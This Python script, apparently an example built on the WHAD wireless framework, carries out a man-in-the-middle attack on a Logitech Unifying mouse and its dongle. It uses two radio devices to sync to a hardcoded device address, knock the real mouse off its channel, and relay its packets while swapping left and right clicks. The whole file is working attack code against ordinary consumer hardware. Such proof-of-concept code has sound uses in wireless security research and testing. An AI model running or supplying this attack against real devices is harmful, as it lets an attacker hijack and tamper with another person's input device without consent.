from whad.unifying import Dongle, Mouse
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
from whad.scapy.layers.esb import *
from whad.scapy.layers.unifying import *
from scapy.compat import raw
import sys
from time import sleep
from random import randint
from enum import IntEnum
'''
import logging
logging.basicConfig(level=logging.DEBUG)
'''

class ManInTheMiddleStage(IntEnum):
    TARGET_CHANNEL_DETECTION = 1
    DESYNCHRONIZATION = 2
    ACTIVE_MITM = 3

active_stage = ManInTheMiddleStage.TARGET_CHANNEL_DETECTION

def pick_channel():
    channels = [5, 8, 11, 14, 17, 20, 29, 32, 35, 38, 41, 44, 47, 56, 59, 62, 65, 68, 71, 74]
    return channels[randint(0, len(channels)-1)]

ack_counter = 0

if __name__ == '__main__':
    if len(sys.argv) >= 3:
        # Retrieve target interface
        interface1 = sys.argv[1]
        interface2 = sys.argv[2]
        active_stage = ManInTheMiddleStage.TARGET_CHANNEL_DETECTION
        # Connect to target device and performs discovery
        try:
            dev1 = WhadDevice.create(interface1)
            dev2 = WhadDevice.create(interface2)
            mouse = Mouse(dev1)
            dongle = Dongle(dev2)
            def showm(pkt):
                global ack_counter, active_stage, mouse, dongle
                #print("[mouse]", pkt.metadata, repr(pkt))
                if active_stage == ManInTheMiddleStage.DESYNCHRONIZATION and ESB_Payload_Hdr in pkt and len(bytes(pkt[ESB_Payload_Hdr:])) == 0 and dongle.channel != mouse.channel:
                    ack_counter += 1
                    if ack_counter == 10:
                        print("Go to active")
                        active_stage = ManInTheMiddleStage.ACTIVE_MITM
                else:
                    pass#print("[mouse]", pkt.metadata, repr(pkt))
            def showd(pkt):
                global active_stage, queue
                if active_stage == ManInTheMiddleStage.ACTIVE_MITM:
                    #print("[dongle]", pkt.metadata, repr(pkt))
                    try:
                        layer = pkt[Logitech_Unifying_Hdr:][1:]
                        if not hasattr(layer, "timeout"):
                            if hasattr(layer, "button_mask") and layer.button_mask == 1:
                                layer.button_mask = 2
                            elif hasattr(layer, "button_mask") and layer.button_mask == 2:
                                layer.button_mask = 1
                            mouse.stack.app.prepare_message(layer)
                    except:
                        pass
            mouse.attach_callback(showm)
            dongle.attach_callback(showd)

            mouse.start()
            mouse.channel = 5
            mouse.address =  "ca:e9:06:ec:a4"
            dongle.address = "ca:e9:06:ec:a4"

            while True:
                if active_stage == ManInTheMiddleStage.TARGET_CHANNEL_DETECTION:
                    while not mouse.synchronize():
                        sleep(1)
                    print("Go to desync")
                    active_stage = ManInTheMiddleStage.DESYNCHRONIZATION
                elif active_stage == ManInTheMiddleStage.DESYNCHRONIZATION:
                    dongle.channel = mouse.channel
                    dongle.start()
                    mouse.channel = pick_channel()
                    mouse.lock()

                    ack_counter = 0
                    dongle.auto(False)
                    dongle.send(ESB_Hdr()/ESB_Payload_Hdr()/Logitech_Unifying_Hdr()/Logitech_Keepalive_Payload(timeout=1))
                    dongle.auto(True)
                    sleep(5)
                    if active_stage == ManInTheMiddleStage.DESYNCHRONIZATION:
                        print("Go to scan")
                        active_stage = ManInTheMiddleStage.TARGET_CHANNEL_DETECTION
                        mouse.unlock()
                        dongle.stop()
                elif active_stage == ManInTheMiddleStage.ACTIVE_MITM:
                    sleep(1)





        except (KeyboardInterrupt, SystemExit):
            mouse.stop()
            dongle.stop()
            dev1.close()
            dev2.close()

        except WhadDeviceNotFound:
            print('[e] Device not found')
            exit(1)
    else:
        print('Usage: %s [device1] [device2]' % sys.argv[0])
